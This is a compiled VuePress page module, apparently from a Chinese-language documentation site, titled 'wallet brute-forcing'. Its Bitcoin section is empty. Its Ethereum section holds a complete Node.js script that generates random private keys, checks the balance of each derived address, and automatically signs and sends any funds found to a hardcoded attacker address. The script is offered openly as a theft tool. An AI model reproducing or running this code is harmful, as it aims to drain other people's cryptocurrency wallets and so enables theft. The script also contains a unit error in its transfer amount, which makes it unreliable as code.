import{_ as a,K as t,L as p,a5 as e,M as n,N as o,W as c,F as i}from"./framework-edebdfe1.js";const l={},u=n("h1",{id:"钱包暴力破解",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#钱包暴力破解","aria-hidden":"true"},"#"),o(" 钱包暴力破解")],-1),r=c(`<h2 id="bitcoin-btc" tabindex="-1"><a class="header-anchor" href="#bitcoin-btc" aria-hidden="true">#</a> BitCoin(BTC)</h2><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="ethereum-eth" tabindex="-1"><a class="header-anchor" href="#ethereum-eth" aria-hidden="true">#</a> Ethereum(ETH)</h2><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token comment">// https://privatekeys.pw/keys/ethereum/1</span>

<span class="token keyword">const</span> <span class="token punctuation">{</span> Web3 <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&#39;web3&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> web3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Web3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&#39;crypto&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">function</span> <span class="token function">generateRandomHexString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">&#39;hex&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">sendTransaction</span><span class="token punctuation">(</span><span class="token parameter">address<span class="token punctuation">,</span>privateKey<span class="token punctuation">,</span>value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> fromAddress <span class="token operator">=</span> address<span class="token punctuation">;</span>
    <span class="token keyword">const</span> privateKey1 <span class="token operator">=</span> privateKey<span class="token punctuation">;</span>
    <span class="token comment">// 获取当前交易计数 (nonce)</span>
    <span class="token keyword">const</span> nonce <span class="token operator">=</span> <span class="token keyword">await</span> web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span><span class="token function">getTransactionCount</span><span class="token punctuation">(</span>fromAddress<span class="token punctuation">,</span> <span class="token string">&#39;latest&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 设置交易参数</span>
    <span class="token keyword">const</span> tx <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">from</span><span class="token operator">:</span> fromAddress<span class="token punctuation">,</span>
    <span class="token literal-property property">to</span><span class="token operator">:</span> <span class="token string">&#39;0xfb0bc05F1aC61a566E70890e0e000E66F147ae66&#39;</span><span class="token punctuation">,</span>
    <span class="token literal-property property">value</span><span class="token operator">:</span> web3<span class="token punctuation">.</span>utils<span class="token punctuation">.</span><span class="token function">toWei</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token string">&#39;ether&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">// 发送 0.1 ETH</span>
    <span class="token literal-property property">gas</span><span class="token operator">:</span> <span class="token number">21000</span><span class="token punctuation">,</span>  <span class="token comment">// 用于简单的 ETH 转账</span>
    <span class="token literal-property property">gasPrice</span><span class="token operator">:</span> <span class="token keyword">await</span> web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span><span class="token function">getGasPrice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">// 获取当前网络的 gas 价格</span>
    <span class="token literal-property property">nonce</span><span class="token operator">:</span> nonce<span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token comment">// 签名交易</span>
    <span class="token keyword">const</span> signedTx <span class="token operator">=</span> <span class="token keyword">await</span> web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span><span class="token function">signTransaction</span><span class="token punctuation">(</span>tx<span class="token punctuation">,</span> privateKey1<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 发送已签名的交易</span>
    web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span><span class="token function">sendSignedTransaction</span><span class="token punctuation">(</span>signedTx<span class="token punctuation">.</span>rawTransaction<span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">&#39;receipt&#39;</span><span class="token punctuation">,</span> <span class="token parameter">receipt</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&#39;交易成功:&#39;</span><span class="token punctuation">,</span> receipt<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">&#39;error&#39;</span><span class="token punctuation">,</span> <span class="token parameter">err</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">&#39;交易失败:&#39;</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">crack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">const</span> privateKey <span class="token operator">=</span> <span class="token string">&#39;0x&#39;</span><span class="token operator">+</span> <span class="token function">generateRandomHexString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> accountFromPrivateKey <span class="token operator">=</span> web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span><span class="token function">privateKeyToAccount</span><span class="token punctuation">(</span>privateKey<span class="token punctuation">)</span><span class="token punctuation">;</span>

    web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span><span class="token function">getBalance</span><span class="token punctuation">(</span>accountFromPrivateKey<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">balance</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>privateKey<span class="token operator">+</span><span class="token string">&quot;|&quot;</span><span class="token punctuation">,</span>accountFromPrivateKey<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token string">&#39; Balance:&#39;</span><span class="token punctuation">,</span> web3<span class="token punctuation">.</span>utils<span class="token punctuation">.</span><span class="token function">fromWei</span><span class="token punctuation">(</span>balance<span class="token punctuation">,</span> <span class="token string">&#39;ether&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&#39;ETH&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>balance <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">sendTransaction</span><span class="token punctuation">(</span>accountFromPrivateKey<span class="token punctuation">.</span>address<span class="token punctuation">,</span>privateKey<span class="token punctuation">,</span>balance<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">err</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">setInterval</span><span class="token punctuation">(</span>crack<span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,4);function k(d,v){const s=i("DocsAD");return t(),p("div",null,[u,e(s),r])}const b=a(l,[["render",k],["__file","walletcrack.html.vue"]]);export{b as default};